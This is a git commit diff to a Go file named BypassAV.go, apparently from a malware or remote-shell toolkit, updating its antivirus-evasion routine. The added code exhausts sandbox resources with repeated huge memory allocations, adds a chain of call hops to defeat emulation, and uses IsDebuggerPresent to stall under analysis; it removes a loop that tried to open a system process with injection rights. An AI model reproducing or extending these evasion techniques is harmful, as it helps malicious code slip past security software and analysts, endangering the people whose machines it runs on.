0d15dce4797d9f567fc83711f69ba36adf1ab9e1
Ege Balcı <egebal1996@gmail.com>
2016-08-22 16:41:28 +0300

    Update BypassAV.go

--- RSE/BypassAV.go
+++ RSE/BypassAV.go
@@ -1,28 +1,81 @@
 package RSE
 
-func BypassAV(Rate int) { // Rate 1 - 3
+var MagicNumber int64 = 0;  
+
+
+func BypassAV(Rate int) { 
   if Rate == 1 {
     AllocateFakeMemory()
   }else if Rate == 2 {
     AllocateFakeMemory()
-    GoBig()
+    Jump()
+  }else if Rate == 3 {
+    AllocateFakeMemory()
+    Jump()
+    CheckDebugger()
   }
+}
+
+func Jump() {
+  MagicNumber++
+  hop1()
 }
 
 func AllocateFakeMemory()  {
-  var Size int = 30000000
-  Buffer_1 := make([]byte, Size)
-  Buffer_1[0] = 1
-  var Buffer_2 [102400000]byte
-  Buffer_2[0] = 0
+  for i := 0; i < 1000; i++ {
+    var Size int = 30000000
+    Buffer_1 := make([]byte, Size)
+    Buffer_1[0] = 1
+    var Buffer_2 [102400000]byte
+    Buffer_2[0] = 0
+  }
 }
 
-func GoBig()  {
-  for ;; {
-    PID := 4
-    Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(0), uintptr(PID))
-    if Proc != 0 {
-      break
-    }
+func CheckDebugger() {
+  Flag,_,_ := IsDebuggerPresent.Call()
+  if Flag != 0 {
+    //Debugger Active !!
+    CheckDebugger()
   }
+}
+
+
+func hop1() {
+  MagicNumber++
+  hop2()
+}
+func hop2() {
+  MagicNumber++
+  hop3()
+}
+func hop3() {
+  MagicNumber++
+  hop4()
+}
+func hop4() {
+  MagicNumber++
+  hop5()
+}
+func hop5() {
+  MagicNumber++
+  hop6()
+}
+func hop6() {
+  MagicNumber++
+  hop7()
+}
+func hop7() {
+  MagicNumber++
+  hop8()
+}
+func hop8() {
+  MagicNumber++
+  hop9()
+}
+func hop9() {
+  MagicNumber++
+  hop10()
+}
+func hop10() {
+  MagicNumber++
 }
